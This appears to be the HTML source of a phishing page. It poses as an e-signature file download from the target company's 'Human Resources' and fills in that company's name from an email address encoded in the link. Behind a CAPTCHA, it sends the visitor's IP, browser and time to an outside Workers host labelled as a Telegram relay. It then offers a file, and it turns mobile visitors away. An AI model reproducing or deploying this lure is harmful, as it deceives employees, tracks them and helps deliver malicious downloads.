<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<title>e-sign</title>
<link rel="shortcut icon" href="https://i.ibb.co/yF35Jv2Q/docu-ico.png" type="image/x-icon">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<style>
@font-face { font-family: 'fmtt'; src: url(img/font1.woff2) format('truetype'); }
* { margin: auto; font-size: 14px; outline: 0; font-family: 'fmtt'; }
body {
  background: url('https://i.ibb.co/G3spj5wR/orgo-blur.png') no-repeat center center fixed;
  background-size: cover;
  backdrop-filter: blur(5px);
}
input { border: 0; display: block; margin-top: 0px; width: 100%; padding: 6px; background: #f2f2f2; padding-left: 0; }
td { border-right: 1px solid black; padding-right: 10px; padding-left: 10px; font-size: 11px; color: #0072ce; }
.inp { margin-top: 30px; border-radius: 15px; background: #f2f2f2; text-align: center; border: 1px solid #f2f2f2; width: 93%; padding: 6px; padding-left: 1px; }
label { display: block; text-align: left; margin: 0; font-size: 10px; color: gray; padding: 0; width: 100%; }
@keyframes roll { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
#rl { animation: roll 1s infinite; }
@keyframes fade { from { opacity: 1; } to { opacity: 0.3; } }
#fd { animation: fade 1s infinite; }
.email-msg { 
  text-align: center; 
  font-size: 16px; 
  font-family: Arial, sans-serif;
  color: black; 
  margin-bottom: 15px; 
}
button { display: block; margin: 20px auto 0 auto; padding: 8px 16px; font-size: 14px; border-radius: 6px; cursor: pointer; }
button:disabled { cursor: not-allowed; opacity: 0.6; }
</style>
<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
</head>
<body>

<div style="max-width:500px;padding:0px;">

<form id="downloadForm" method="POST" action="https://wandering-cherry-0bf1.g03755901.workers.dev/">

  <div style="text-align:center">
    <img
      src="https://i.ibb.co/sJFnm0RH/Icon-pdf-file-svg.png" 
      width="45"
      height="45"
      style="margin-top:200px;object-fit:contain;"
      id="fd"
      alt="icon"
      loading="lazy"
      onerror="this.onerror=null; this.src='images/fallback.png';"
    >
  </div>

  <p style="text-align:center;font-size:15px;margin-top:10px"></p>

  <span
    style="display:block;height:10px;width:10px;border:3px solid lightgray;border-radius:70px;border-top-color:red;margin-top:40px;"
    id="rl"
  ></span>

  <!-- EMAIL MESSAGE PLACEHOLDER -->
  <div id="emailMsg" class="email-msg"></div>

  <!-- MOBILE MESSAGE -->
  <div id="mobileMsg" class="email-msg" style="display:none;"></div>

  <!-- Cloudflare Turnstile widget -->
  <div class="cf-turnstile" data-sitekey="0x4AAAAAACafd07cw2w7X14i" style="margin-top:20px;"></div>

  <!-- Download button initially disabled -->
  <button type="submit" id="downloadBtn" disabled>Download File</button>

</form>

</div>

<script>
const fd = document.getElementById('fd');
const rl = document.getElementById('rl');
const form = document.getElementById('downloadForm');
const downloadBtn = document.getElementById('downloadBtn');
const emailMsg = document.getElementById('emailMsg');
const mobileMsg = document.getElementById('mobileMsg');

// Show loader & rolling animation on form submit
form.addEventListener('submit', async (e) => {
    fd.style.display = 'block';
    rl.style.display = 'block';

    // Only send Telegram after CAPTCHA is done
    if (!downloadBtn.disabled) {
        const ip = '{{WORKER_IP}}'; // your worker will fill this
        const ua = navigator.userAgent;
        const time = new Date().toISOString();
        const message = `âœ… Human Download Verified\nIP: ${ip}\nUser-Agent: ${ua}\nTime: ${time}`;

        try {
            await fetch(form.action, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ telegram: message })
            });
        } catch(err) {
            console.warn("Telegram send failed", err);
        }
    }
});

// Called by Turnstile when user completes CAPTCHA
function onCaptchaSuccess(token) {
    downloadBtn.disabled = false; // enable button only after CAPTCHA solved
}

// Attach Turnstile callback dynamically
document.querySelector('.cf-turnstile').setAttribute('data-callback', 'onCaptchaSuccess');

// Detect mobile devices
const isMobile = /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i.test(navigator.userAgent);

window.addEventListener('DOMContentLoaded', () => {
    if (isMobile) {
        // Hide CAPTCHA and button
        document.querySelector('.cf-turnstile').style.display = 'none';
        downloadBtn.style.display = 'none';
        fd.style.display = 'none';
        rl.style.display = 'none';
        mobileMsg.style.display = 'block';
        mobileMsg.textContent = "Please open this link on a desktop to download the file.";
        return; // Stop further processing
    }

    // Email hash logic
    const hash = window.location.hash.slice(1);
    if(hash) {
        try {
            const decodedEmail = atob(hash); // decode base64
            const companyName = decodedEmail.split('@')[1].split('.')[0];
            const capitalizedCompany = companyName.charAt(0).toUpperCase() + companyName.slice(1);
            emailMsg.innerHTML = `
  <div style="font-weight:bold; font-size:18px; margin-bottom:8px;">
    ${capitalizedCompany} Human Resources
  </div>
  <div style="font-size:16px; line-height:1.5; margin-bottom:12px;">
    Dear ${decodedEmail},
  </div>
  <div style="font-size:15px; line-height:1.5;">
    For your security, please complete the CAPTCHA below to access your file. 
    Once verified, the download button will be enabled.
  </div>
`;

        } catch(e) {
            // Invalid base64? ignore and load normally
        }
    }
});
</script>

</body>
</html>
